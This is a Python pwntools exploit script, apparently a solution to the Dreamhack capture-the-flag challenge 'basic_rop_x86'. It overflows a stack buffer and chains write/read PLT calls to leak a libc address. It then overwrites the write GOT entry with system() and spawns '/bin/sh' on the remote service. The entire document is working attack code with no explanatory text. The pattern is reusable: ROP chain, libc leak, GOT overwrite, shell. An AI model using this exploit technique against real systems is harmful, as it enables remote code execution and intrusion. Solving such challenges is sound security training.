from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

context.log_level = 'debug'

p = remote("host2.dreamhack.games", 17458)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

read_got = e.got["read"]
read_plt = e.plt["read"]
write_got = e.got["write"]
write_plt = e.plt["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

binsh = e.bss()

pppr = 0x08048689

payload = b'A'*0x44 + b'B'*0x4 # buf ~ ebp + sfp

# write(1, read_got, 0x4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# read(0, binsh, 0x8)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(binsh)
payload += p32(8)

# read(0, write_got, 0x4)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

# write("/bin/sh")
payload += p32(write_plt)
payload += p32(0)
payload += p32(binsh)

p.send(payload)
p.recvuntil('A'*0x40)
read_address = u32(p.recvn(4))
libc_base = read_address - read_offset
system_address = libc_base + system_offset

log("libc_base", libc_base)
log("read_address", read_address)
log("system_address", system_address)

p.send(b"/bin/sh\x00")
p.sendline(p32(system_address))

p.interactive()
